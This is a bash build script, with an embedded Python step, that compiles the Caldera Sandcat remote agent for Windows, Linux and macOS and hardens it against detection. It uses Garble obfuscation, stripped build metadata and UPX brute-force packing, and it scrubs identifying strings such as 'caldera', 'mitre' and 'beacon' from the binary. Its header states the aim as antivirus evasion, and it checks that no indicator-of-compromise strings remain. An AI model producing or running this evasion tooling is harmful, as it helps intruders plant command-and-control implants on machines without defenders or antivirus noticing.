#!/bin/bash
# Merlino ULTRA-STEALTH Build Script
# Maximum obfuscation + packing for AV evasion

set -e

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
YELLOW='\033[1;33m'
NC='\033[0m'

echo -e "${BLUE}===============================================${NC}"
echo -e "${BLUE}    MERLINO ULTRA-STEALTH BUILDER${NC}"
echo -e "${BLUE}    Garble + UPX + Custom LDFLAGS${NC}"
echo -e "${BLUE}===============================================${NC}"
echo ""

# Paths
GOCAT_DIR="plugins/sandcat/gocat"
PAYLOAD_DIR="plugins/sandcat/payloads"
GOPATH_BIN="$(go env GOPATH)/bin"
export PATH="$PATH:$GOPATH_BIN"

cd "$GOCAT_DIR" || exit 1

# Generate random values
RANDOM_KEY=$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 30)
BUILD_TIME=$(date +%s)

echo -e "${BLUE}[*]${NC} Random key: $RANDOM_KEY"
echo -e "${BLUE}[*]${NC} Build timestamp: $BUILD_TIME"
echo ""

# Advanced LDFLAGS
LDFLAGS="-s -w -buildid="
LDFLAGS="$LDFLAGS -X main.key=$RANDOM_KEY"
LDFLAGS="$LDFLAGS -X main.initialDelay=$BUILD_TIME"
LDFLAGS="$LDFLAGS -extldflags=-static"

# Garble flags for maximum obfuscation
GARBLE_FLAGS="-tiny -literals -seed=random"

echo -e "${YELLOW}[1/3]${NC} Compiling Windows with Garble obfuscation..."
echo -e "${BLUE}    [*]${NC} Using Garble flags: $GARBLE_FLAGS"

GOOS=windows GOARCH=amd64 CGO_ENABLED=0 garble $GARBLE_FLAGS build \
    -trimpath \
    -ldflags="$LDFLAGS" \
    -o "$PAYLOAD_DIR/sandcat.go-windows.raw" \
    sandcat.go

if [ $? -eq 0 ]; then
    SIZE=$(stat -c%s "$PAYLOAD_DIR/sandcat.go-windows.raw" | numfmt --to=iec)
    echo -e "${GREEN}[+]${NC} Garble compilation complete ($SIZE)"
    
    # Apply additional string obfuscation
    echo -e "${BLUE}    [*]${NC} Applying additional string obfuscation..."
    python3 - <<'EOFPYTHON'
import random
import string

def obfuscate_strings(binary_path):
    with open(binary_path, 'rb') as f:
        data = bytearray(f.read())
    
    # Additional suspicious strings to remove
    patterns = [
        b'sandcat', b'Sandcat', b'SANDCAT',
        b'caldera', b'Caldera', b'CALDERA',
        b'mitre', b'MITRE', b'Mitre',
        b'gocat', b'GoCat', b'GOCAT',
        b'beacon', b'Beacon',
        b'agent', b'Agent',
        b'payload', b'Payload',
        b'github.com/mitre',
        b'adversary', b'Adversary'
    ]
    
    changes = 0
    for pattern in patterns:
        if pattern in data:
            replacement = ''.join(random.choices(string.ascii_letters + string.digits, k=len(pattern))).encode()
            data = data.replace(pattern, replacement)
            changes += 1
    
    with open(binary_path, 'wb') as f:
        f.write(data)
    
    return changes

BINARY = 'plugins/sandcat/payloads/sandcat.go-windows.raw'
changes = obfuscate_strings(BINARY)
print(f"    [+] Obfuscated {changes} additional string patterns")
EOFPYTHON
    
    # UPX Packing (with brute compression)
    echo -e "${BLUE}    [*]${NC} Applying UPX packing (brute force)..."
    upx --best --ultra-brute "$PAYLOAD_DIR/sandcat.go-windows.raw" -o "$PAYLOAD_DIR/sandcat.go-windows" 2>/dev/null
    
    if [ $? -eq 0 ]; then
        FINAL_SIZE=$(stat -c%s "$PAYLOAD_DIR/sandcat.go-windows" | numfmt --to=iec)
        echo -e "${GREEN}[+]${NC} UPX compression complete ($FINAL_SIZE)"
        rm -f "$PAYLOAD_DIR/sandcat.go-windows.raw"
    else
        echo -e "${YELLOW}[!]${NC} UPX packing failed, using unpacked binary"
        mv "$PAYLOAD_DIR/sandcat.go-windows.raw" "$PAYLOAD_DIR/sandcat.go-windows"
    fi
    
    # Verify no IoC strings
    echo -e "${BLUE}    [*]${NC} Verifying IoC removal..."
    IOC_COUNT=$(strings "$PAYLOAD_DIR/sandcat.go-windows" | grep -iE 'mitre|caldera|gocat|sandcat' | wc -l)
    if [ "$IOC_COUNT" -eq 0 ]; then
        echo -e "${GREEN}[+]${NC} Zero IoC strings found - CLEAN!"
    else
        echo -e "${RED}[X]${NC} Warning: $IOC_COUNT IoC strings still present"
    fi
else
    echo -e "${RED}[X]${NC} Windows compilation failed!"
    exit 1
fi

echo ""
echo -e "${YELLOW}[2/3]${NC} Compiling Linux with Garble obfuscation..."

GOOS=linux GOARCH=amd64 CGO_ENABLED=0 garble $GARBLE_FLAGS build \
    -trimpath \
    -ldflags="$LDFLAGS" \
    -o "$PAYLOAD_DIR/sandcat.go-linux" \
    sandcat.go

if [ $? -eq 0 ]; then
    SIZE=$(stat -c%s "$PAYLOAD_DIR/sandcat.go-linux" | numfmt --to=iec)
    echo -e "${GREEN}[+]${NC} Linux build complete ($SIZE)"
    
    # UPX for Linux
    upx --best --ultra-brute "$PAYLOAD_DIR/sandcat.go-linux" 2>/dev/null || true
fi

echo ""
echo -e "${YELLOW}[3/3]${NC} Compiling macOS with Garble obfuscation..."

GOOS=darwin GOARCH=amd64 CGO_ENABLED=0 garble $GARBLE_FLAGS build \
    -trimpath \
    -ldflags="$LDFLAGS" \
    -o "$PAYLOAD_DIR/sandcat.go-darwin" \
    sandcat.go

if [ $? -eq 0 ]; then
    SIZE=$(stat -c%s "$PAYLOAD_DIR/sandcat.go-darwin" | numfmt --to=iec)
    echo -e "${GREEN}[+]${NC} macOS build complete ($SIZE)"
fi

echo ""
echo -e "${GREEN}===============================================${NC}"
echo -e "${GREEN}    BUILD COMPLETE!${NC}"
echo -e "${GREEN}===============================================${NC}"
echo ""
echo -e "Windows payload: ${BLUE}$PAYLOAD_DIR/sandcat.go-windows${NC}"
echo -e "Linux payload:   ${BLUE}$PAYLOAD_DIR/sandcat.go-linux${NC}"
echo -e "macOS payload:   ${BLUE}$PAYLOAD_DIR/sandcat.go-darwin${NC}"
echo ""
